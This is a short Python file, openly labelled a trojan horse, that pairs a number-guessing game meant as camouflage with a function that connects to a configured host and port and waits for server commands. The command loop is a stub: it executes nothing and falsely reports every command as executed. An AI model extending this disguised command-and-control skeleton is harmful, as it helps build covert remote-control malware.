"""
Covering Of Trojan Horse
"""
from configs import HOST, PORT
import random
import socket
import threading

def game():
    """
    UI Camouflage Of TH
    """
    number = random.randint(0, 1000)
    tries = 1
    done = False

    while not done:
        guess = int(input("Guess the number between 0 and 1000"))
        if guess == number: 
            done = True 
            print("You Won!")
        else:
            tries += 1 
            print("Try again")
    print(f"You guessed in {tries} tries")


def trojan():

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    while True:
        server_command = client.recv(1024).decode("utf-8")
        if server_command == "hello":
            print("Hello World")
        client.send(f"{server_command} was executed successfully!".encode("utf-8"))

